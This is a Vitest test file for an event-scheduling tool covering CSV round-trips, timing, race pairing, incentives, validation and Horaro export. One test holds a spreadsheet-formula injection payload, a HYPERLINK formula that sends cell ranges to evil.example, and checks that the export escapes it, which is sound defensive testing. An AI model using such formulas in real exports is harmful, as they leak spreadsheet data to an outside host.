// @vitest-environment node
import { describe, expect, it } from "vitest";

import { csvRowsToDraft, detectRowType, parseCsv, submissionsToCsv } from "#/utilities/schedule/csv";
import { planSubmissionStatuses } from "#/utilities/schedule/finalise";
import { buildHoraroSchedule, secondsToIsoDuration } from "#/utilities/schedule/horaro";
import { mergeSpecialRequirements, splitRacerNames, suggestPartners } from "#/utilities/schedule/pairing";
import { mergeIncentiveData } from "#/utilities/schedule/server";
import { computeSchedule, estimateToMs, eventDayIndex, normaliseEstimate } from "#/utilities/schedule/timing";
import type { DraftRow, EventSummary, SubmissionSummary } from "#/utilities/schedule/types";
import { validateDraft } from "#/utilities/schedule/validation";

const event: EventSummary = {
	id: 1,
	name: "Test Event",
	shortName: "TEST",
	// 10am Melbourne time (AEST, UTC+10)
	startTime: "2026-07-04T00:00:00.000Z",
	endTime: "2026-07-05T12:00:00.000Z",
	timezone: "Australia/Melbourne",
};

function submission(overrides: Partial<SubmissionSummary>): SubmissionSummary {
	return {
		id: 1,
		runnerId: "u1",
		runnerUsername: "alice",
		game: "Super Mario 64",
		category: "16 Star",
		platform: "N64",
		techPlatform: "",
		estimate: "00:20:00",
		raceType: "noRace",
		racer: "",
		isCoop: false,
		canBackup: false,
		status: "pending",
		specialRequirements: "",
		availability: [true, true],
		donationIncentives: [],
		...overrides,
	};
}

function row(overrides: Partial<DraftRow>): DraftRow {
	return {
		key: "r",
		type: "run",
		submissionIds: [],
		gameName: "Game",
		category: "Any%",
		platform: "PC",
		techPlatform: "",
		estimate: "01:00:00",
		setupMinutesOverride: null,
		runnerIds: ["u1"],
		otherRunners: "",
		isRace: false,
		isCoop: false,
		specialRequirements: "",
		pairingConfirmed: true,
		racerHint: "",
		...overrides,
	};
}

let keyCounter = 0;
const makeKey = () => `k${++keyCounter}`;

describe("timing", () => {
	it("parses and normalises estimates", () => {
		expect(estimateToMs("1:30")).toBe(90 * 60 * 1000);
		expect(estimateToMs("00:20:30")).toBe((20 * 60 + 30) * 1000);
		expect(estimateToMs("abc")).toBeNull();
		expect(normaliseEstimate("1:05")).toBe("01:05:00");
	});

	it("flows rows with default and overridden setup times", () => {
		const timed = computeSchedule(
			[
				row({ key: "a", estimate: "01:00:00" }),
				row({ key: "b", type: "setupBuffer", estimate: "00:15:00" }),
				row({ key: "c", estimate: "00:30:00", setupMinutesOverride: 0 }),
				row({ key: "d", estimate: "00:10:00" }),
			],
			event.startTime as string,
			10,
		);

		const starts = timed.map((entry) => entry.start.toISOString());
		expect(starts).toEqual([
			"2026-07-04T00:00:00.000Z",
			"2026-07-04T01:10:00.000Z", // run + 10 min setup
			"2026-07-04T01:25:00.000Z", // buffer has no setup
			"2026-07-04T01:55:00.000Z", // override of 0
		]);
	});

	it("works out the event day in the event timezone", () => {
		// 11:30pm Melbourne on day 1
		expect(eventDayIndex(new Date("2026-07-04T13:30:00.000Z"), event.startTime as string, event.timezone)).toBe(0);
		// 12:30am Melbourne on day 2
		expect(eventDayIndex(new Date("2026-07-04T14:30:00.000Z"), event.startTime as string, event.timezone)).toBe(1);
	});
});

describe("csv", () => {
	it("round-trips submissions through the export and import", () => {
		const submissions = [
			submission({
				id: 7,
				donationIncentives: [{ title: "Bonus star", description: "Get it", time: "10 mins" }],
				specialRequirements: "Needs a CRT",
			}),
		];
		const csv = submissionsToCsv(event, submissions);
		expect(csv.split("\r\n")[0]).toContain("Available Sat 04 Jul");

		const parsed = parseCsv(csv);
		const draft = csvRowsToDraft(parsed, { submissions, users: [], games: [], makeKey });

		expect(draft.rows).toHaveLength(1);
		expect(draft.rows[0]).toMatchObject({
			type: "run",
			submissionIds: [7],
			gameName: "Super Mario 64",
			runnerIds: ["u1"],
			estimate: "00:20:00",
			specialRequirements: "Needs a CRT",
		});
		expect(draft.incentives).toHaveLength(1);
		expect(draft.incentives[0]).toMatchObject({ title: "Bonus star", sourceSubmissionId: 7, status: "pending" });
		expect(draft.report.newGames).toEqual(["Super Mario 64"]);
	});

	it("escapes spreadsheet formulas in the export and restores them on import", () => {
		const payload = '=HYPERLINK("https://evil.example/?d="&C2:C500,"Click")';
		const submissions = [submission({ id: 8, game: payload, specialRequirements: "-needs a desk", runnerUsername: "-dash" })];
		const csv = submissionsToCsv(event, submissions);

		expect(csv).not.toMatch(/(^|,)"?=HYPERLINK/m);
		expect(csv).toContain(`'=HYPERLINK`);

		const [row] = parseCsv(csv);
		expect(row.game).toBe(payload);
		expect(row.specialRequirements).toBe("-needs a desk");
		expect(row.runner).toBe("-dash");
	});

	it("detects buffers and sleep blocks", () => {
		expect(detectRowType({ game: "Setup Buffer" })).toBe("setupBuffer");
		expect(detectRowType({ game: "sleep" })).toBe("sleep");
		expect(detectRowType({ type: "other", game: "Charity talk" })).toBe("other");
		// A real submission called "Sleep" is still a run
		expect(detectRowType({ game: "Sleep", id: "3" })).toBe("run");

		const draft = csvRowsToDraft(
			[
				{ game: "Sleep", category: "Overnight", estimate: "8:00" },
				{ game: "Setup Buffer", estimate: "0:15" },
			],
			{ submissions: [], users: [], games: [], makeKey },
		);
		expect(draft.rows.map((entry) => [entry.type, entry.category, entry.estimate])).toEqual([
			["sleep", "Overnight", "08:00:00"],
			["setupBuffer", "", "00:15:00"],
		]);
	});

	it("reports unknown submissions, unmatched runners and edited values", () => {
		const draft = csvRowsToDraft(
			[
				{ id: "999", game: "Mystery", category: "Any%", estimate: "1:00", runner: "nobody", platform: "PC" },
				{ game: "Celeste", category: "Any%", estimate: "0:30", runner: "Bob", platform: "PC" },
				{ id: "1", game: "Super Mario 64", category: "70 Star", estimate: "0:50" },
			],
			{
				submissions: [submission({ id: 1 })],
				users: [{ id: "u2", username: "bob" }],
				games: [{ id: 1, name: "super mario 64" }],
				makeKey,
			},
		);

		expect(draft.report.unknownSubmissionIds).toEqual(["999"]);
		expect(draft.report.unmatchedRunners).toEqual(["nobody"]);
		expect(draft.rows[1].runnerIds).toEqual(["u2"]);
		expect(draft.rows[2]).toMatchObject({ category: "70 Star", estimate: "00:50:00" });
		expect(draft.report.newGames).toEqual(["Mystery", "Celeste"]);
	});

	it("marks races as needing pairing", () => {
		const draft = csvRowsToDraft([{ id: "1" }], {
			submissions: [submission({ id: 1, raceType: "only", racer: "bob", isCoop: true })],
			users: [],
			games: [],
			makeKey,
		});
		expect(draft.rows[0]).toMatchObject({ isRace: true, isCoop: true, pairingConfirmed: false, racerHint: "bob" });
	});
});

describe("pairing", () => {
	it("splits racer names", () => {
		expect(splitRacerNames("Alice, Bob & @Carol vs. dave")).toEqual(["alice", "bob", "carol", "dave"]);
	});

	it("ranks the partner that names each other highest", () => {
		const submissions = [
			submission({ id: 1, runnerId: "u1", runnerUsername: "alice", raceType: "only", racer: "Bob" }),
			submission({ id: 2, runnerId: "u2", runnerUsername: "bob", raceType: "only", racer: "alice" }),
			submission({ id: 3, runnerId: "u3", runnerUsername: "carol", raceType: "solo", category: "120 Star" }),
			submission({ id: 4, runnerId: "u4", runnerUsername: "dan", raceType: "noRace" }),
		];
		const suggestions = suggestPartners(
			row({
				submissionIds: [1],
				runnerIds: ["u1"],
				gameName: "Super Mario 64",
				category: "16 Star",
				isRace: true,
				racerHint: "Bob",
			}),
			submissions,
		);

		expect(suggestions.map((suggestion) => suggestion.submission.id)).toEqual([2, 3]);
		expect(suggestions[0].score).toBeGreaterThan(suggestions[1].score);
	});

	it("merges special requirements per runner", () => {
		expect(
			mergeSpecialRequirements([
				submission({ runnerUsername: "alice", specialRequirements: "CRT" }),
				submission({ runnerUsername: "bob", specialRequirements: "" }),
				submission({ runnerUsername: "carol", specialRequirements: "Left-handed controller" }),
			]),
		).toBe("alice: CRT\ncarol: Left-handed controller");
		expect(mergeSpecialRequirements([submission({ specialRequirements: " CRT " })])).toBe("CRT");
	});
});

describe("incentives", () => {
	it("keeps donation totals when re-applying the same type", () => {
		expect(
			mergeIncentiveData("goal", { goal: 500, current: 0 }, { type: "goal", data: { goal: 300, current: 120 } }),
		).toEqual({
			goal: 500,
			current: 120,
		});
		expect(
			mergeIncentiveData(
				"war",
				{
					options: [
						{ name: "Red", total: 0 },
						{ name: "Green", total: 0 },
					],
				},
				{ type: "war", data: { options: [{ name: "red", total: 50 }] } },
			),
		).toEqual({
			options: [
				{ name: "Red", total: 50 },
				{ name: "Green", total: 0 },
			],
		});
		expect(mergeIncentiveData("goal", { goal: 100, current: 0 }, { type: "war", data: { options: [] } })).toEqual({
			goal: 100,
			current: 0,
		});
	});
});

describe("finalise", () => {
	const submissions = [
		submission({ id: 1, runnerId: "u1" }),
		submission({ id: 2, runnerId: "u1", canBackup: true }),
		submission({ id: 3, runnerId: "u2", canBackup: true }),
		submission({ id: 4, runnerId: "u3" }),
		submission({ id: 5, runnerId: "u4", status: "backup" }),
		submission({ id: 6, runnerId: "u5" }),
	];
	const rows = [row({ submissionIds: [1, 6] }), row({ type: "setupBuffer", submissionIds: [] })];

	it("accepts linked submissions and applies the backup rule", () => {
		const all = planSubmissionStatuses(rows, submissions, { backupRule: "all", skipReviewed: false });
		expect(all.counts).toEqual({ pending: 0, accepted: 2, backup: 2, rejected: 2 });

		const acceptedOnly = planSubmissionStatuses(rows, submissions, {
			backupRule: "acceptedRunnersOnly",
			skipReviewed: false,
		});
		expect(Object.fromEntries(acceptedOnly.changes.map((change) => [change.id, change.to]))).toMatchObject({
			1: "accepted",
			2: "backup",
			3: "rejected",
			4: "rejected",
			5: "rejected",
			6: "accepted",
		});

		const none = planSubmissionStatuses(rows, submissions, { backupRule: "none", skipReviewed: true });
		expect(none.counts.backup).toBe(1); // the already-reviewed one is left alone
		expect(none.changes.find((change) => change.id === 5)).toBeUndefined();
	});
});

describe("validation", () => {
	it("flags errors and availability warnings", () => {
		const issues = validateDraft(
			{
				defaultSetupMinutes: 10,
				rows: [
					row({ key: "a", estimate: "bad" }),
					row({ key: "b", gameName: "", submissionIds: [1], estimate: "20:00:00" }),
					row({ key: "c", submissionIds: [2], isRace: true, pairingConfirmed: false }),
				],
				incentives: [
					{
						key: "i",
						rowKey: "a",
						sourceSubmissionId: null,
						status: "configured",
						title: "Goal",
						description: "",
						notes: "",
						type: "goal",
						data: { goal: "x" as unknown as number, current: 0 },
					},
				],
			},
			event,
			[submission({ id: 1 }), submission({ id: 2, runnerUsername: "bob", availability: [true, false] })],
		);

		const messages = issues.map((issue) => `${issue.level}:${issue.rowKey ?? issue.incentiveKey ?? ""}`);
		expect(messages).toContain("error:a"); // bad estimate
		expect(messages).toContain("error:b"); // missing game
		expect(messages).toContain("warning:c"); // availability + pairing
		expect(messages).toContain("error:i"); // invalid goal data
		expect(issues.some((issue) => issue.message.includes("bob did not mark themselves available on day 2"))).toBe(
			true,
		);
	});
});

describe("horaro", () => {
	it("folds extra gaps into item lengths", () => {
		expect(secondsToIsoDuration(5400)).toBe("PT1H30M");

		const horaro = buildHoraroSchedule({ name: "Test", shortName: "TEST", timezone: "Australia/Melbourne" }, [
			{
				type: "run",
				title: "A",
				game: "A",
				category: "Any%",
				platform: "PC",
				estimate: "01:00:00",
				scheduledTime: "2026-07-04T00:00:00.000Z",
				isRace: true,
				isCoop: false,
				runners: [{ username: "alice", twitch: "alice_tv" }, { username: "bob" }],
				otherRunners: "",
				incentives: ["Bonus"],
			},
			{
				type: "sleep",
				title: "Sleep",
				game: "",
				category: "Overnight",
				platform: "",
				estimate: "08:00:00",
				scheduledTime: "2026-07-04T01:10:00.000Z",
				isRace: false,
				isCoop: false,
				runners: [],
				otherRunners: "",
				incentives: [],
			},
			{
				type: "run",
				title: "B",
				game: "B",
				category: "Any%",
				platform: "PC",
				estimate: "00:30:00",
				scheduledTime: "2026-07-04T09:30:00.000Z",
				isRace: false,
				isCoop: false,
				runners: [],
				otherRunners: "Guest",
				incentives: [],
			},
		]);

		expect(horaro.schedule.setup_t).toBe(10 * 60);
		expect(horaro.schedule.items.map((item) => item.length_t)).toEqual([3600, 8 * 3600 + 10 * 60, 1800]);
		expect(horaro.schedule.items[0].data[2]).toBe("[alice](https://www.twitch.tv/alice_tv) vs. bob");
		expect(horaro.schedule.items[1].data[0]).toBe("Overnight");
	});
});
